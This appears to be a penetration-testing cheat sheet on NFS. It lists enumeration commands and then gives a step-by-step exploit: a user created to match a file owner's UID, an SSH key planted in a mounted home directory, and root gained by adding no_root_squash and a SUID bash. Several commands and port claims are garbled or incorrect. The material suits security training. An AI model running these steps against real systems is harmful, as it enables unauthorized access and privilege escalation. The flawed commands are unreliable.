# Network File Sharing

Network File Sharing (NFS) is a protocol that allows you to share directories and files with other Linux clients over a network.

NFS server uses following port numbers :- 2049, 111, 1110, 4045

## Banner Grabbing 
	 
```
nc -v $ip 2049

```   
```    
telnet $ip

```
## Nfs version detection

	nmap -v -p 2049, 111, 1110, 4045 -sT -sV -sC -A $ip

## Script Scan

There are 3 scripts available for nfs enumeration in nmap

##### 1. The nfs-ls.nse script attempts to get useful information about files from NFS exports. The output is intended to resemble the output of ls. 

	 nmap -v -p 2049, 111, 1110, 4045 -sT -sV -sC --scripts=nfs-ls.nse $ip

##### 2. Retrieves disk space statistics and information from a remote NFS share.
	  
  	 nmap -v -p 2049, 111, 1110, 4045 -sT -sV -sC --scripts=nfs-statfs.nse $ip
	  
##### 3. The nfs-showmount.nse script shows NFS exports
	  
     nmap -v -p 2049, 111, 1110, 4045 -sT -sV -sC --scripts=nfs-showmount.nse $ip

## Enumerate nfs share

NFS uses Remote Procedure Calls (RPC) route requests between clients and servers, meaning that the portmap service must be enabled and active at the proper runlevels for NFS communication to occur. By default rpc uses port number 135.

```
showmount -e $ip
```	
```
rpcinfo -p $ip
```
```
rpcclient -I $ip
```	
```
rpcbind -h $ip
```
```
rpcinfo -n 135 $ip
```
```
rpcclient -U 135 $ip
```

## Mount a NFS share

```
mount -t nfs $ip:/ /mnt -o nolock
```
```
mount -t nfs [-o vers=2] 10.12.0.150:/ /mnt/ -o nolock  -  specify to use version 2 because it doesn't have any authentication or authorization.
```
## Use nfspy to mount a share

	nfspysh -o server=$ip:/mnt

Now u can check the directory mount

	df -h

## Permissions

If you mount a folder which contains files or folders only accesible by some user (by UID). You can create locally a user with that UID and using that user you will be able to access the file/folder.

# Exploiting Nfs shares

## Gain Access by Exploiting NFS Shares

### Lets check information about an NFS server

```
showmount -e $ip	
Export list for $ip:
/home/user *
```
```
mount -t nfs -o vers=3 -o nolock $ip:/home/user /mnt/d1 
```	
The mounted share cannot be accessed, probably because the root_squash flag is set.

```
cd /mnt/d1	
cd: permission denied: d1
```		
```
ls -lh
drwxr-x---  2 2008 2008 4.0K Sep  2  2012 d1
```		
We know the uid so we can add a user with the same uid so that we can access the d1 folder.

```
adduser --uid 2008 user
```	
Now we can access the folder we can place the ssh key here so we can make the ssh connection.

1. Create ssh key pair in local machine.
```
ssh-keygen
```		
```
su - user
```
2. Create .ssh folder in mounted share /home/user/.ssh
```
mkdir .ssh
```
3. Now copy  the public key to from the local machine to the target machine's /home/user/.ssh folder.
```
cp ssh-rsa <ssh_public key> /mnt/d1/.ssh/authorized_keys
```
4. Now make SSH connection
```
ssh user@$ip
```		
## Escalate the Privileges by NFS 

After getting ssh connection if we have allowed to edit  the /etc/exports file and add an entry.

```
vim /etc/exports
```
```
/data/  *(rw,sync,no_root_squash)
``` 
```
mount -t nfs  $ip:/data  /mnt 
```
```
cp /usr/bin/bash /mnt/
```
```
chown root:root /mnt/bash
```
```
chmod +s /mnt/bash
```
```
ssh user@$ip
```
```
./bash -p
```

In this way we can become the root!!!!!
